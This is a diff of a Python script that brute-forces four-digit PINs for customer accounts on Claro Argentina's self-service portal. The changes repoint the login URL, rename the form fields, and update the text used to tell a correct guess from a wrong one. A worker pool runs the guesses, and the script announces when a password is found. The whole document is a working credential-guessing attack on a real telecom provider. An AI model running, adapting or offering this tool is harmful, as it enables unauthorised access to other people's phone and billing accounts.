@@ -13,6 +13,8 @@ LOGINURL = ("""http://individuos.claro.com.ar/web/guest/bienvenido"""
     """?p_p_id=58&p_p_lifecycle=1&p_p_state=normal&p_p_mode=view"""
     """&p_p_col_id=column-1&p_p_col_count=1&saveLastPath=0"""
     """&_58_struts_action=%2Flogin%2Flogin""")
+LOGINURL = ("""http://www.servicios.claroargentina.com/AutogestionCore2006/"""
+    """servlet/Controller?EVENT=WELCOMEMAS""")
 
 
 
@@ -63,24 +65,28 @@ class Login:
         pass_str = "%04d" % password
 
         try:
-            form["_58_login"] = loginNumber
-            form["_58_password"] = pass_str
+
+#            form["_58_login"] = loginNumber
+#            form["_58_password"] = pass_str
+
+            form["loginNumber"] = loginNumber
+            form["password"] = pass_str
+
             html = self.opener.open(form.click()).read()
         except (urllib2.URLError, urllib2.HTTPError):
             return None
         else:
-            if '/c/portal/logout' in html:
+#            if '/c/portal/logout' in html:
+            if 'href="Controller?EVENT=DATOS_FACTURA"' in html:
                 debug("Encontrada: %s" % password)
                 return pass_str
-            elif 'saveLastPath=0&_58_struts_action=%2Flogin%2Flogin' in html:
+#            elif 'saveLastPath=0&_58_struts_action=%2Flogin%2Flogin' in html:
+            elif 'El Nro. o Password ingresados son incorrectos.' in html:
                 debug("No es %s" % pass_str)
                 return False
-            elif 'En este momento no podemos atender tu consulta.' in html:
+            else:
                 debug("Sin servicio, %s" % password)
                 return None
-            else:
-                debug("Error desconocido")
-                return html
 
 
 def main(opts=None, args=None):
@@ -108,10 +114,10 @@ def main(opts=None, args=None):
     result = farm.wait_eval()
 
     if result:
-        print("¡La contraseña de %s es %s !" % (loginNumber, result))
+        print(u"¡La contraseña de %s es %s !" % (loginNumber, result))
         return 0
     else:
-        error("No pude encontrar la contraseña :(")
+        error(u"No pude encontrar la contraseña :(")
         return 1
 
 
